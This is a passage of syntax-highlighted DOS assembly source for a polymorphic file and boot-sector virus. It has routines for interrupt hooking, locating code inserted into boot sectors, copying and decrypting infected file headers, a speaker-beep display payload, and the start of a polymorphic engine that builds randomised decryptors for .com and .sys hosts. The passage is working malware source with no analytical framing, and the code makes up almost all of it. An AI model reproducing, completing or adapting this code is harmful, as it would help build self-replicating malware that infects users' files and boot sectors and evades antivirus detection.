                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ret_off</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Unhook int 24h and clear dos infection switch                             ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">unhook_ints</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Clear dos running switch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">running_sw</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc1">;Restore int 24h</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old24h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_int</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Perform a call to dos function                                            ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">dos_call</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">org21h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Get position of code inserted into boot sector                            ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">get_position</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc1">;Point di to offset in buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc1">;Get displacement</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Check for short jump</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">check_jump</span><span class="sc0">

                </span><span class="sc1">;Store 8bit displacement</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">add_offset</span><span class="sc0">        
</span><span class="sc5">check_jump</span><span class="sc4">:</span><span class="sc0">        
                </span><span class="sc1">;Check for near jump</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_displacement</span><span class="sc0">
</span><span class="sc5">add_offset</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">no_displacement</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Make a copy of file header                                                ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">copy_header</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Copy header to buffer</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">file_header_size</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Decrypt header                                                            ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">decrypt_header</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">file_header_size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">file_header_size</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">restore_header</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">restore_header</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Print string while producing some beeps                                   ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">loop_beep_string</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Get character</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">print_that_char</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">print_that_char</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Print character        </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc1">;Produce a click</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">generate_beep</span><span class="sc0">

                </span><span class="sc1">;Move cursor to next position</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loop_beep_string</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Generate a speaker beep                                                   ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">generate_beep</span><span class="sc4">:</span><span class="sc0">        

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0008h</span><span class="sc0">
</span><span class="sc5">loop_click</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc1">;Get attention of the 8253</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B6h</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc1">;Sent frequency</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">042h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">  </span><span class="sc2">042h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc1">;Send signal to speaker</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc1">;Sound duration</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
</span><span class="sc5">wait_cycle</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">wait_cycle</span><span class="sc0">

                </span><span class="sc1">;Clear signal</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">061h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FCh</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_click</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Polymorphic engine                                                        ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">do_encrypt</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc1">;Reset pointer to random data</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">rnd_pointer</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc5">try_new_generation</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Initialize engine</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">poly_data</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Clear last_subrotine</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Clear decrypt_sub</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Clear last_fill_type</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Clear last_step_type</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Clear last_int_type</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Ah</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc1">;Clear decrypt_pointer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc1">;Get base address for memory operations</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_copy</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_delta</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Choose counter and pointer register</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">get_si_di_off</span><span class="sc4">:</span><span class="sc0">        
                </span><span class="sc1">;Choose displacement from / to encrypted code</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">get_si_di_off</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc1">;Choose type of decrypt sequence</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">get_decrypt_reg</span><span class="sc4">:</span><span class="sc0">        

                </span><span class="sc1">;Choose register for decryption instructions</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">38h</span><span class="sc0">

                </span><span class="sc1">;Do not use bl or bh into .sys decryptors</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exit_address</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_com</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \
                                                   </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_ret</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ok_decrypt_reg</span><span class="sc0">

                </span><span class="sc1">;Check if it is bl</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">get_decrypt_reg</span><span class="sc0">

                </span><span class="sc1">;Check if it is bh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">get_decrypt_reg</span><span class="sc0">

</span><span class="sc5">ok_decrypt_reg</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc1">;Choose segment registers for memory operations</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_seg_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
